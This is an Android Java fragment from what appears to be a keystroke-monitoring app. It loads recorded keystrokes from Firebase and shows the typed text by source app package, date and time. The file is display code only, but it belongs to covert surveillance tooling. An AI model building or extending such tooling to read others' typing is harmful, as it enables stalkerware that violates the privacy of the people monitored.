package com.vikasyadavnsit.cdc.fragment;

import android.app.Activity;
import android.graphics.Typeface;
import android.os.Bundle;
import android.util.DisplayMetrics;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.GridLayout;
import android.widget.LinearLayout;
import android.widget.Spinner;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

import com.vikasyadavnsit.cdc.R;
import com.vikasyadavnsit.cdc.data.KeyStrokeData;
import com.vikasyadavnsit.cdc.data.SpinnerItem;
import com.vikasyadavnsit.cdc.utils.CommonUtil;
import com.vikasyadavnsit.cdc.utils.FirebaseUtils;

import java.time.LocalDate;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.TreeSet;

public class KeyStrokesFragment extends Fragment {

    private static GridLayout fragmentLayout;
    private static Spinner dropdownSpinner;
    private static ArrayAdapter<SpinnerItem> spinnerArrayAdapter;

    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater,
                             @Nullable ViewGroup container,
                             @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_key_strokes, container, false);
        fragmentLayout = view.findViewById(R.id.keystrokes_fragment_layout);
        dropdownSpinner = view.findViewById(R.id.keystrokes_fragment_dropdown_spinner);

        fragmentLayout.setColumnCount(calculateNoOfColumns());
        CommonUtil.showLoader();
        FirebaseUtils.getAndroidUserKeystrokes();

        return view;
    }

    private int calculateNoOfColumns() {
        DisplayMetrics displayMetrics = getResources().getDisplayMetrics();
        float dpWidth = displayMetrics.widthPixels / displayMetrics.density;
        return Math.max(1, Math.min((int) (dpWidth / 300), 3)); // Minimum 1, maximum 3 columns
    }

    public static void displayKeyStrokes(Activity activity, Map<String, KeyStrokeData> keyStrokeDataMap) {
        TreeSet<String> uniqueAppPackages = new TreeSet<>();

        for (KeyStrokeData data : keyStrokeDataMap.values()) {
            if (data != null && data.getAppPackage() != null) {
                uniqueAppPackages.add(data.getAppPackage());
            }
        }

        initializeSpinner(activity, uniqueAppPackages);
        setupSpinnerListener(activity, keyStrokeDataMap);
        CommonUtil.hideLoader();

    }

    private static void initializeSpinner(Activity activity, TreeSet<String> uniqueAppPackages) {
        SpinnerItem[] items = new SpinnerItem[uniqueAppPackages.size() + 2];
        items[0] = new SpinnerItem("Select an application", null);
        items[1] = new SpinnerItem("Show all apps data", null);

        int index = 2;
        for (String appPackage : uniqueAppPackages) {
            items[index++] = new SpinnerItem(appPackage, null);
        }

        spinnerArrayAdapter = new ArrayAdapter<>(activity, android.R.layout.simple_spinner_item, items);
        spinnerArrayAdapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
        dropdownSpinner.setAdapter(spinnerArrayAdapter);
    }

    private static void setupSpinnerListener(Activity activity, Map<String, KeyStrokeData> keyStrokeDataMap) {
        dropdownSpinner.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener() {
            @Override
            public void onItemSelected(AdapterView<?> parent, View view, int position, long id) {
                fragmentLayout.removeAllViews();

                if (position == 0) {
                    // Do nothing for the placeholder
                } else if (position == 1) {
                    displayAllAppsData(activity, keyStrokeDataMap);
                } else {
                    displaySelectedAppData(activity, keyStrokeDataMap, (SpinnerItem) parent.getItemAtPosition(position));
                }
            }

            @Override
            public void onNothingSelected(AdapterView<?> parent) {
            }
        });
    }

    private static void displayAllAppsData(Activity activity, Map<String, KeyStrokeData> keyStrokeDataMap) {
        Map<String, List<KeyStrokeData>> groupedData = groupDataByDate(keyStrokeDataMap);

        for (Map.Entry<String, List<KeyStrokeData>> entry : groupedData.entrySet()) {
            LinearLayout groupLayout = createGroupLayout(activity, "Date : " + entry.getKey());
            for (KeyStrokeData keyStrokeData : entry.getValue()) {
                addKeyStrokeToGroup(groupLayout, keyStrokeData);
            }
            fragmentLayout.addView(groupLayout);
        }
    }

    private static void displaySelectedAppData(Activity activity, Map<String, KeyStrokeData> keyStrokeDataMap, SpinnerItem selectedItem) {
        String selectedPackageName = selectedItem.getLabel();
        Map<LocalDate, List<KeyStrokeData>> groupedData = new HashMap<>();

        // Group keystroke data by date
        keyStrokeDataMap.values().stream()
                .filter(data -> data.getAppPackage().equals(selectedPackageName))
                .forEach(data -> {
                    LocalDate date = LocalDateTime.parse(data.getTimestamp()).toLocalDate();
                    groupedData.computeIfAbsent(date, k -> new ArrayList<>()).add(data);
                });

        // Sort the grouped data by date in descending order
        List<LocalDate> sortedDates = new ArrayList<>(groupedData.keySet());
        sortedDates.sort((date1, date2) -> date2.compareTo(date1)); // Sort in descending order

        // Display the sorted data
        for (LocalDate date : sortedDates) {
            LinearLayout groupLayout = createGroupLayout(activity, "Date : " + date.toString());
            for (KeyStrokeData keystroke : groupedData.get(date)) {
                addKeyStrokeToGroup(groupLayout, keystroke);
            }
            fragmentLayout.addView(groupLayout);
        }
    }


    private static Map<String, List<KeyStrokeData>> groupDataByDate(Map<String, KeyStrokeData> keyStrokeDataMap) {
        Map<LocalDate, List<KeyStrokeData>> groupedData = new HashMap<>();

        keyStrokeDataMap.values().forEach(keyStrokeData -> {
            LocalDate date = LocalDateTime.parse(keyStrokeData.getTimestamp()).toLocalDate();
            groupedData.computeIfAbsent(date, k -> new ArrayList<>()).add(keyStrokeData);
        });

        // Create a LinkedHashMap to sort dates in descending order
        List<LocalDate> sortedKeys = new ArrayList<>(groupedData.keySet());
        sortedKeys.sort(Comparator.reverseOrder()); // Sort in descending order

        Map<String, List<KeyStrokeData>> sortedGroupedData = new LinkedHashMap<>();
        for (LocalDate key : sortedKeys) {
            sortedGroupedData.put(key.toString(), groupedData.get(key));
        }

        return sortedGroupedData;
    }


    private static LinearLayout createGroupLayout(Activity activity, String dateText) {
        LinearLayout groupLayout = new LinearLayout(activity);
        groupLayout.setOrientation(LinearLayout.VERTICAL);
        groupLayout.setLayoutParams(createGroupLayoutParams());
        groupLayout.setPadding(16, 24, 16, 16);
        groupLayout.setBackgroundResource(R.drawable.group_border);

        TextView dateTextView = new TextView(activity);
        dateTextView.setText(dateText);
        dateTextView.setLayoutParams(createLabelLayoutParams());
        dateTextView.setTextSize(16);
        dateTextView.setTypeface(null, Typeface.BOLD);
        groupLayout.addView(dateTextView);

        return groupLayout;
    }

    private static void addKeyStrokeToGroup(LinearLayout groupLayout, KeyStrokeData keyStrokeData) {
        TextView textView = new TextView(groupLayout.getContext());
        String formattedTime = LocalDateTime.parse(keyStrokeData.getTimestamp()).format(DateTimeFormatter.ofPattern("HH:mm:ss"));
        String displayText = formattedTime + " - " + keyStrokeData.getText();
        textView.setText(displayText);
        textView.setLayoutParams(createLabelLayoutParams());
        groupLayout.addView(textView);
    }

    private static GridLayout.LayoutParams createGroupLayoutParams() {
        GridLayout.LayoutParams groupParams = new GridLayout.LayoutParams();
        groupParams.width = 0;
        groupParams.height = GridLayout.LayoutParams.WRAP_CONTENT;
        groupParams.columnSpec = GridLayout.spec(GridLayout.UNDEFINED, 1f);
        groupParams.setMargins(8, 16, 8, 16);
        return groupParams;
    }

    private static LinearLayout.LayoutParams createLabelLayoutParams() {
        LinearLayout.LayoutParams labelParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
        );
        labelParams.setMargins(8, 8, 8, 8);
        return labelParams;
    }
}
